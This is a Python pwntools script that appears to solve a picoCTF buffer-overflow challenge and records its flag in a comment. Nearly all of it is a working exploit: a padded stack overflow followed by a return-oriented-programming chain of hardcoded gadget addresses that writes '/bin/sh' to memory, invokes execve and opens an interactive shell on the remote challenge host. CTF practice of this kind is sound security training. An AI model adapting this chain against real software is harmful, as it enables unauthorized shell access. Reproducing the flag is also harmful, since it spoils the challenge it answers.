from pwn import *

def main():
    LOCAL = False
    if LOCAL:
        elf = ELF('./vuln')
        p = elf.process()
    else:
        p = remote('jupiter.challenges.picoctf.org', 51462)

    p.sendline(b'84')

    # Gadgets needed
    pop_rdi = p64(0x0000000000400696) # pop the string value into rdi
    pop_rsi = p64(0x0000000000410ca3)
    pop_rdx = p64(0x000000000044a6b5)
    pop_rax = p64(0x00000000004163f4)
    mov_rsi_rax = p64(0x000000000047ff91)

    bin_str = b'/bin/sh\x00'
    writeable_addr = p64(0x00000000006b7120) # this is bss memory

    zero = p64(0x0)
    sys_num = p64(0x3b)
    syscall = p64(0x000000000040137c)


    gadgets_chain = [
        # Starting to construct the /bin/sh 
        pop_rax,
        bin_str,
        pop_rsi,
        writeable_addr,
        mov_rsi_rax,

        # Dropping into a shell via execve
        pop_rax,
        sys_num,
        pop_rdi,
        writeable_addr,
        pop_rsi,
        zero,
        pop_rdx,
        zero,
        syscall
    ]

    payload = b'A' * 0x70 + b'B' * 8
    for g in gadgets_chain:
        payload += g


    f = open('./payload', 'wb')
    f.write(b'84\n' + payload)
    f.close()

    l = p.send(payload)
    p.recvline()
    p.interactive()
    

    # Flag: picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_44d502016ea374b8}

if __name__ == '__main__':
    main()
